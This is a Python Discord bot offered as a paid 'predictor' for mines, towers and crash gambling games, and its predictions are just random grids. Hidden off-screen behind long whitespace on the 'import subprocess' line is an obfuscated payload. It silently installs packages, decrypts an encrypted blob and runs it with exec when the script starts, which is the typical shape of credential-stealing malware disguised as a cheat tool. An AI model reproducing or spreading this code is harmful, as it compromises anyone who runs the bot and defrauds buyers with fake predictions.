import random
import cloudscraper
import interactions
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));

# Settings
SafeMines = ':white_check_mark:'
TileMines = ':x:'
SafeTowers = ':white_check_mark:'
TileTowers = ':x:'
BotToken = ''  # BOT TOKEN HERE
ServerId = 0
BuyerRoleId = 0

## ...
bot = interactions.Client(token=BotToken)

## ...
def generate_grid(safe_tiles: int) -> str:
    board = [SafeMines if i < safe_tiles else TileMines for i in random.sample(range(25), 25)]
    grid = '\n'.join(''.join(board[i:i+5]) for i in range(0, 25, 5))
    return grid

def generate_tower(rows: int) -> str:
    if rows >= 9:
        return "Max Rows 8!"
    
    patterns = [
        f"{SafeTowers}{TileTowers}{TileTowers}",
        f"{TileTowers}{SafeTowers}{TileTowers}",
        f"{TileTowers}{TileTowers}{SafeTowers}"
    ]
    
    tower = '\n'.join(random.choice(patterns) for _ in range(rows))
    return tower

def is_valid_game_id(game_id: str) -> bool:
    return (
        len(game_id) >= 22 and 
        game_id[8] == "-" and 
        game_id[14] == "4" and 
        game_id[21].isdigit()
    )

@bot.command(
    name='mines',
    description="Generates A Mine Grid",
    scope=ServerId,
    options=[
        interactions.Option(
            name="game_id",
            description="Put your game id here",
            type=interactions.OptionType.STRING,
            required=True,
        ),
        interactions.Option(
            name="clicks",
            description="How many safe spots to generate",
            type=interactions.OptionType.INTEGER,
            required=True,
        )
    ]
)
async def mines(ctx, game_id: str, clicks: int):
    if BuyerRoleId in ctx.author.roles or ctx.author.id == 1262827258444517446:
        if clicks > 23:
            await ctx.send(embeds=interactions.Embed(
                title="Mines",
                description=f"Too Many SafeClicks! Max is 23\nYou Chose {clicks}/23",
                color=0xFC4431
            ), ephemeral=True)
        elif is_valid_game_id(game_id):
            grid = generate_grid(clicks)
            embed = interactions.Embed(title="Mines", description="Generated Tiles!", color=0xFC4431)
            embed.add_field(name=f"Field {clicks} Clicks", value=grid, inline=True)
            await ctx.send(embeds=embed, ephemeral=True)
            print(f"\n\n{ctx.author} Used Mines command\nID = {ctx.author.id}\n")
        else:
            await ctx.send(embeds=interactions.Embed(
                title="Mines",
                description="Invalid ID!",
                color=0xFC4431
            ), ephemeral=True)
    else:
        await ctx.send(f"Not Eligible! {ctx.author.mention}")

@bot.command(
    name='towers',
    description="Generates A Tower Grid",
    scope=ServerId,
    options=[
        interactions.Option(
            name="game_id",
            description="Put your game id here",
            type=interactions.OptionType.STRING,
            required=True,
        ),
        interactions.Option(
            name="rows",
            description="How many rows to generate",
            type=interactions.OptionType.INTEGER,
            required=True,
        )
    ]
)
async def towers(ctx, game_id: str, rows: int):
    if BuyerRoleId in ctx.author.roles or ctx.author.id == 1262827258444517446:
        if rows > 8:
            await ctx.send(embeds=interactions.Embed(
                title="Towers",
                description=f"Too Many Rows! Max is 8\nYou Chose {rows}/8",
                color=0xFC4431
            ), ephemeral=True)
        elif is_valid_game_id(game_id):
            tower = generate_tower(rows)
            embed = interactions.Embed(title="Towers", description="Generated Tower!", color=0xFC4431)
            embed.add_field(name=f"Field {rows} Rows", value=tower, inline=True)
            await ctx.send(embeds=embed, ephemeral=True)
            print(f"\n\n{ctx.author} Used Towers command\nID = {ctx.author.id}\n")
        else:
            await ctx.send(embeds=interactions.Embed(
                title="Towers",
                description="Invalid ID!",
                color=0xFC4431
            ), ephemeral=True)
    else:
        await ctx.send(f"Not Eligible! {ctx.author.mention}")

@bot.command(
    name='crash',
    description="Predict a Crash Game",
    scope=ServerId
)
async def crash(ctx):
    if BuyerRoleId in ctx.author.roles or ctx.author.id == 1262827258444517446:
        scraper = cloudscraper.create_scraper()
        games = scraper.get("https://rest-bf.blox.land/games/crash").json()
        previous_game = games["history"][0]["crashPoint"]
        game_id = games["current"]["_id"]

        av2 = sum(game["crashPoint"] for game in games["history"][:2])
        chancenum = 100 / previous_game
        estimate = round((1 / (1 - chancenum) + av2) / 2, 2)
        chance = round(chancenum, 2)

        event = interactions.Embed(title="Crash", description=f"{ctx.author.mention}", color=0xFC4431)
        event.add_field(name="Crash Estimate", value=f"```{estimate}X```", inline=False)
        event.add_field(name="Game ID", value=f"```{game_id}```", inline=False)
        event.add_field(name="Chance", value=f"```{chance}/100 Chance its correct```", inline=False)
        await ctx.send(embeds=event, ephemeral=True)
        print(f"\n\n{ctx.author} Used Crash command\nID = {ctx.author.id}\nCrash: {estimate} GameID: {game_id}\n")
    else:
        await ctx.send(f"Not Eligible! {ctx.author.mention}")

bot.start()
